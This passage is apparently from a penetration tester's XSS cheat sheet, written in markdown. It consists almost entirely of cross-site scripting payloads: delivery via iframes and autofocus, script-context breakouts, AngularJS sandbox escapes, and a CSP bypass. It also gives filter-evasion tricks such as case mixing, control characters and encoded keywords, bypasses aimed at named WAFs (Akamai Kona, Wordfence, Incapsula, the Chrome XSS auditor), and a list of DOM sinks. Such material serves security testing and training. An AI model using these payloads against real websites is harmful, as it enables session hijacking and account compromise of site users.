4. After finding an unfiltered tag, set the payload to `<[tag]+§[payload]§="alert()">`.
5. Set the payload to a list of events.
6. The basic payload will be `<[tag]+[event]="[js]">`.

Deliver through IFrame:
```html
<iframe src="<url>" onload="...">
```

Deliver with custom tag with autofocus:
```html
<script>
location = "<url>/?search=<xss id='x' onfocus='...' tabindex=1>#x";
</script>
```

#### Javascript Block
Escape from string such as `var x = 'input'`:
```html
</script><script>...</script>
```

Escape from strings with angled brackets encoded:
```html
'-<payload>-'
';<payload>//
```

Evade filters:
```html
\';<...>//  # Double quote filter
onerror=<func>;throw <arg>  # Assign to error event.
&apos;-<...>-&apos;  # HTML escaped quotes
```

#### JS Template Literals
Inject `${<...>}` in the string:
```javascript
`Welcome, ${user.displayName}.`;
```

#### AngularJS Sandbox Escape
Overwrite the charAt method to join characters:
```javascript
toString().constructor.prototype.charAt%3d[].join;
$eval('x=<...>')
[1]|orderBy:toString().constructor.fromCharCode(120 61 <charcode payload>)=1  # 120 61 is for 'x='
```

Content Security Policy Bypass:
```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],<...>)'">
```

## Filter Evasion

### Common Techniques
#### Script Tag
Weak tag parsing bypass:
```html
<ScRiPt>...</sCrIpT>
<ScRiPt>...  # Unclosed tags
<script/[gibberish]>...<script>
<script [\n\r\t]>...</script>
<script [\x00 \x0D \x0A]>... </script [\x00 \x0D \x0A]>
<scr<script>ipt>...</scr<script>ipt>
```

Common alternative tags (require user interaction):
```html
<a href="javascript:[code]">show</a>
<a href="data:text/html;base64,[base64 payload]">show</a>
<form action="javascript:[code]><button>Click me</button></form>
<form id="f1"></form><button form="x" formaction="javascript:[code]">Click me</button>
<object data="javascript:[code]">
<object data="text/html:<script>[code]</script>">
<object data="data:text/html;base64,[base64 payload]">
```

EvilCos (download [here](https://github.com/evilcos/xss.swf)):
```html
<object data="[evil site]/xss.wfs">
<object data="[evil site]/xss.wfs" allowscriptaccess="always">
```

### Events
Common HTML 4:
```html
<body onload="[code]">
<input type="image" src="x" onerror="[code]">
<isindex onmouseover="[code]">
<form oninput="[code]"><input></form>
<textarea autofocus onfocus="[code]">
<input oncut="[code]">
```

Common HTML 5:
```html
<svg onload="[code]">
<keygen autofocus onfocus="[code]">
<video><source onerror="[code]">
<marquee onstart="[code]">
```

Filter Bypass:
```html
<svg/onload=...>
<svg///////onload=...>
<svg id="x";onload=...>
<svg id=x;onload=...>
<svg id=`x`onload=...>
```

Control characters:
```html
<svg onload%09=...>
<svg %09onload=...>
<svg %09onload%20=...>
<svg onload%09%20%28%2c%3b=...>
<svg onload%0b=...>
```

List of control characters:
```html
%09 %0b %0c %20 %3b  # Internet Explorer
%09 %20 %28 %2c %3b  # Google Chrome
%2c %3b  # Safari
%09 %20 %28 %2c %3b  # Firefox
%09 %20 %2c %3b  # Opera
%09 %20 %28 %2c %3b  # Android
```

### Keywords
#### Bypass by Encoding
```javascript
alert
\u0061lert
&#x0061lert
&#97lert

// Encoding formats below require the input to be in a string
eval('\141lert')
eval('\x61lert')

// Useless escape characters
eval('\a\l\e\rt(\1\)')
```

#### Bypass by Constructing Strings
```javascript
alert
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,

116)  # Hex unicode encoding
atob("YWxkcnQ=")  # Base64 payload
17795081..toString(36)  # Convert the number on the left to a base36 string
```

#### Alternative Function Sinks
```javascript
setTimeout
setInterval
Function
[].constructor.constructor("[code]")
```

### Sanitation Bypass
#### Remove Tags
```html
<scr<script>ipt>...</script>  # The script might check only the first instance
<scr<iframe>ipt>...</script>  # Recursive scripts might not start every iteration from the beginning of the string
```

#### Escape Quotes
```javascript
eval(\'...\')  # The filter replaces ' with \' so by adding \ we obtain \' --> \\' 
String.fromCharCode(...)  # Generate string from sequence of unicode hex chars
unescape(/%78%u0073%73/.source)  # Decode escaped characters
decodeURI(/alert(%22...%22)/.source)  # Decode URL escaped chars
decodeURIComponent(/alert(%22...%22)/.source)  # Decode URL escaped chars
```

#### Escape Parentheses
```html
<img src=x onerror="window.onerror=eval;throw='alert\x28\x29'"
```

## WAF Bypass

### Google Chrome Payloads
#### Google XSS Audit Bypass
```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

#### Chrome < v60 Beta XSS-Auditor Bypass
```html
<script src="data:,alert(1)%250A-->
```

#### Other Google Audit Bypass Payloads
```html
<script>alert(1)</script
<script>alert(1)%0d%0a-->%09</script
<x>%00%00%00%00%00%00%00<script>alert(1)</script>
```

### Safari
```html
<script>location.href;'javascript:alert%281%29'</script>
```

### Kona WAF (Akamai) Bypass
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

### Wordfence
```html
<meter onmouseover="alert(1)"
'">><div><meter onmouseover="alert(1)"</div>"
>><marquee loop=1 width=0 onfinish=alert(1)>
```

### Incapsula WAF
```html
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
<img/src=q onerror='new Function`al\ert\`1\``'>
```

## DOM Based XSS

### Injection Vectors
#### document
```javascript
document.write()
document.writeln()
document.domain
```

#### element
```javascript
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

#### Dynamic href
```html
<param>=javascript:...
```

#### $(...) with hashchange event
```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=...>'">
```

#### AngularJS ng-app
```html
{{$on.constructor('<...>')()}}
```



